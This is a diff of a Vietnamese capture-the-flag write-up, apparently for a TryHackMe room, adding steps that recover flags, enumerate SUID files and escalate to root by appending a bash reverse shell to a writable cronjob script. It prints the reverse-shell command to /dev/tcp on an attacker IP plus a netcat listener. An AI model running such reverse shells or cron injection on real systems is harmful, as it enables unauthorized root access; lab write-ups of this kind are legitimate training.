@@ -277,7 +277,15 @@ Khả năng cao đây là md5, ta lên tìm kiếm md5 reverse và được:
 
 ![image](https://github.com/manhhuy2002/Writeup/assets/104350480/344482c0-4f49-4420-81e9-0a48ef8c95e2)
 
-Tiếp tục lục tung trang web ta được 1 thẻ p hidden bị giấu trong trang web cổng 65524:
+Ngoài ra quay lại trang web với port 65524, kéo xuống ta được:
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/21b49a77-cdc2-4770-be4c-8ad776eb15e5)
+
+Vậy flag3 là flag{9fdafbd64c47471a8f54cd3fc64cd312}. Nếu mà tìm ngược lại hash tương ứng thì ta được
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/54af2286-8b1a-43fd-98a3-63719c3f988d)
+
+Tiếp tục lục tiếp trong trang này: 
 
 ![image](https://github.com/manhhuy2002/Writeup/assets/104350480/12d66331-4617-4e6b-b960-b2ebbbf1c847)
 
@@ -287,6 +295,7 @@ Nó có vẻ được encode với dạng base gì đó, ta thử decode giá tr
 
 Vậy đây là đường dẫn bị ẩn cần tìm.
 > /n0th1ng3ls3m4tt3r
+
 
 Tiếp tục truy cập và khai thác tiếp. Ta được điều hướng sang 1 trang khác:
 
@@ -321,25 +330,41 @@ Thực thi ssh:
 
 ![image](https://github.com/manhhuy2002/Writeup/assets/104350480/2d1f0288-a0b8-4c62-a26e-866d5c338886)
 
+Có thể đọc file user.txt:
 
-Giờ ta cần leo thang đặc quyền lên root để có để đọc được file flag còn lại. Thử từng dạng:
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/3f4d4faa-cb41-4c64-8a22-96623d815015)
+
+Nhưng định dạng flag đang không chuẩn, ta ném lên cyberchef xem thu được gì không: 
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/31893488-9e5e-44c7-a4a1-4ef7d82710c4)
+
+> flag{n0wits33msn0rm4l}
+
+Giờ ta cần leo thang đặc quyền lên root để có để đọc được file flag root. Thử từng dạng:
+
 > sudo -l: không có
 
 > find / -perm -4000 -ls 2>/dev/null 
 
-![image](https://github.com/manhhuy2002/Writeup/assets/104350480/6a1ba4b5-9c65-45b3-bcd6-863b7c205168)
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/559f9e2e-76fa-44e4-9a2b-dabeaf80d669)
 
-Cũng không có gì.
+Cả 2 đều không có gì để leo thang được
 
-Tiếp đến là crontab: 
+Tiếp đến là check cronjob: 
 
 ![image](https://github.com/manhhuy2002/Writeup/assets/104350480/612d5a68-6f3c-4270-91d6-feb94bfa7826)
 
-É ta có thể leo thang ở đây với cronjob
+É ta có thể leo thang ở đây với cronjob, cụ thể là file .mysecretcronjob.sh
 
-![image](https://github.com/manhhuy2002/Writeup/assets/104350480/3c31fa74-881b-4fe9-8c82-5799d59ad5c1)
+Ta thực thi revershell, mở nc với port 1234, sau đó truyền shell vào file này bằng cách dùng nano hoặc echo >> cũng được
+> bash -i >& /dev/tcp/110.8.84.31/1234 0>&1
 
-> bash -i >& /dev/tcp/10.8.84.31 /1234 0>&1
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/0ba71ea4-f59b-4e1a-8eba-f1aef1f71f19)
+
+Tìm root.txt và cat là được flag: 
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/51ca4a30-fcfa-4390-a018-4dd38166437f)
+
 
 ## [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)<a name='bnn'></a>
 
